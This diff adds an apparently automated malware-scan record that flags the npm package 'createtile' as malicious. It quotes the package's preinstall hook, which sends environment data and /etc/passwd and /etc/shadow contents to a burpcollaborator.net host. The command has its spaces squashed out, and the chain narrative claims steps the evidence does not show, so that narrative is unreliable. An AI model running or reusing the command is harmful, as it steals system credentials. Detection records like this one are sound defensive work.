@@ -1,0 +1,62 @@
+{
+  "package_name": "createtile",
+  "version": "99.0.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 2,
+    "risk_vector": [
+      "data_exfiltration",
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "data_exfiltration",
+        "summary": "The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain.",
+        "details": "The package.json scripts.preinstall command is making network calls to a known exfiltration collector domain. The domain is 'linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net'. This could potentially indicate data exfiltration.",
+        "confidence": 0.83,
+        "evidence_domains": [
+          "linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net"
+        ],
+        "evidence_commands": [
+          "export HOSTNAME&&BCNET=\"linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\";sleep.5;ping-c1$BCNET;foriinenv\"psaux\"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\"cat/etc/hosts/etc/passwd/etc/shadow\";docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)\";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true"
+        ]
+      },
+      {
+        "category": "install_hook",
+        "summary": "The package.json scripts.preinstall command is a known install hook.",
+        "details": "The package.json scripts.preinstall command is a known install hook. This could potentially indicate a supply chain attack.",
+        "confidence": 0.83,
+        "evidence_commands": [
+          "export HOSTNAME&&BCNET=\"linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\";sleep.5;ping-c1$BCNET;foriinenv\"psaux\"cat/proc/version/proc/net/fib_trie/proc/net/if_inet6\"cat/etc/hosts/etc/passwd/etc/shadow\";docurlhttps://$BCNET-ski-m30-d\"$($i2>&1|base64-w0)\";done||ping-n1windows-createtile-h-%COMPUTERNAME%-u-%USERNAME%.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net||true"
+        ]
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials, POST to external domain, install hook downloads remote script, executes it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package purpose is to create a tile, but the detected behaviors suggest exfiltrating tokens",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.5,
+      "explanation": "The chain score suggests a potential attack chain, but the legitimacy check shows that the package purpose is not justified by the detected behaviors"
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.7773,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T10:09:51.291100"
+}
